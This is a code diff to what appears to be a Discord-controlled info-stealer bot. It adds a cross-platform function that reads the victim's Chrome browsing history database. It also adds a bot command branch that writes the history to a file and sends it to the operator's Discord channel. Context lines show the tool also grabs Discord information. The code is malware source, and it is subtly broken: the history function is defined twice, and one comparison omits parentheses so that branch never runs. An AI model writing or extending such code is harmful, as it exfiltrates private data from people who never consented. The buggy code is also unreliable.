@@ -96,6 +96,30 @@ def grab_discord_info():
 def get_chrome_history():
     if platform.system() == 'Windows':
         history_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\History')
+    elif platform.system() == 'Darwin':
+        history_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
+    else:
+        history_path = os.path.expanduser('~/.config/google-chrome/Default/History')
+
+    connection = sqlite3.connect(history_path)
+    cursor = connection.cursor()
+
+    cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC')
+
+    history_items = cursor.fetchall()
+
+    history_data = ""
+    for item in history_items:
+        url, title, visit_count, last_visit_time = item
+        history_data += f"Title: {title}\nURL: {url}\nVisits: {visit_count}\n\n"
+
+    connection.close()
+
+    return history_data if history_data else "No history found."
+
+def get_chrome_history():
+    if platform.system() == 'Windows':
+        history_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\History')
     else:
         history_path = os.path.expanduser('~/.config/google-chrome/Default/History')
 
@@ -225,6 +249,25 @@ async def grab(ctx, info, description='Grabs info on computer'):
             
         except Exception as e:
             print("[ERR] %s"%str(e))
+        os.remove(temp_file_path)
+
+    if info.lower == "history":
+        history = get_chrome_history()
+        temp_file_path = os.path.join(os.path.expanduser('~'), 'history.txt')
+        
+        with open(temp_file_path, 'w', encoding='utf-8') as file:
+            file.write(history)
+
+        if len(history) < 2000:
+            embed = discord.Embed(
+                title="Browser History",
+                description=history,
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send(file=discord.File(temp_file_path))
+
         os.remove(temp_file_path)
 
     if info.lower() == "discord":
